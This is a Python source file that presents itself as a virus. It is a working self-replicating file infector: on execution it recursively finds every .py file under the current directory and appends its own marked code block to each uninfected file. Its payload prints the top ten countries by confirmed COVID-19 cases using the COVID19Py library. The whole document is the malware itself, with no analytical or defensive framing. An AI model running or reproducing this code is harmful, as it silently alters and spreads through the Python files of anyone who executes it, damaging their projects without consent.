### -_- VIRUS -_- ###
import glob,sys,re,COVID19Py

### INFECTION VECTOR ###

def getVirusCode():
    virusCode = []
    fileHandler = open(sys.argv[0],"r")
    lines = fileHandler.readlines()
    fileHandler.close()
    inVirus = False
    for line in lines:
        if(re.search('^### -_- VIRUS -_- ###',line)):
            inVirus = True
        if(inVirus):
            virusCode.append(line)
        if(re.search('^### -_- VIRUS END -_- ###',line)):
            break
    return virusCode

def find_victims():
    return glob.glob("**/*.py",recursive=True)

def infectVirus():
    victims = find_victims()
    for victim in victims:
        fileHandler = open(victim,"r")
        programCode = fileHandler.readlines()
        fileHandler.close()
        infected = False
        for line in programCode:
            if("### -_- VIRUS -_- ###" in line):
                infected = True
                break
        
        if not infected:
            newCode = []
            newCode.extend(programCode)
            newCode.extend(getVirusCode())
            
            fileHandler = open(victim,"w")
            fileHandler.writelines(newCode)
            fileHandler.close() 

### TRIGGER ###
infectVirus()

### PAYLOAD ###
def getCovidINFO():
    covid19 = COVID19Py.COVID19()
    locations = covid19.getLocations(rank_by='confirmed')
    print("Top-10 countries with highest coronavirus infections: ")
    for i in range(10):
        print(locations[i]['country'] + " " + str(locations[i]['latest']['confirmed']))
        i+=1

getCovidINFO()

### -_- VIRUS END -_- ###